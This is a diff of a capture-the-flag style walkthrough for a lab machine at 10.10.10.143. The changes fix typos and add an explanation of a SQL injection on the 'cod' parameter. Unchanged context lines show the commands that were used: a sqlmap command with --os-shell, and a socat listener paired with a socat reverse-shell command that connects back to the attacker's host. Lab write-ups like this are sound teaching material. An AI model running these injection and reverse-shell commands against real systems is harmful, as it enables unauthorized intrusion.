@@ -47,11 +47,15 @@ parameter to indicate the number of the room, for example:
 http://10.10.10.143/room.php?cod=1
 ```
 We can try to see if it's vulnerable to `SQL` injection by visiting the
-following urls:
+following URL:
 ```
 http://10.10.10.143/room.php?cod=1337 or 1=1
 ```
-It will return the first room even if the `cod` parameter does not match.
+It will return the first room even if the `cod` parameter does not match,
+because the `or 1=1` condition, makes the query looks like (it's an assumption):
+```
+SELECT * FROM rooms where code = 1337 or 1=1
+```
 
 ## Getting a shell
 
@@ -63,14 +67,14 @@ sqlmap -u http://10.10.10.143/room.php?cod=1 --os-shell --random-agent
 
 And it does work! We have a shell as `www-data` user.
 
-We can get a better shell thant this one by running a `socat` listener on our
+We can get a better shell than this one by running a `socat` listener on our
 machine with this command:
 ```
-socat file:`tty`,raw,echo=0 tcp-listen:1337
+$ socat file:`tty`,raw,echo=0 tcp-listen:1337
 ```
 and connect to it with this command:
 ```
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.8:1337
+$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.8:1337
 ```
 
 ## Further enumeration
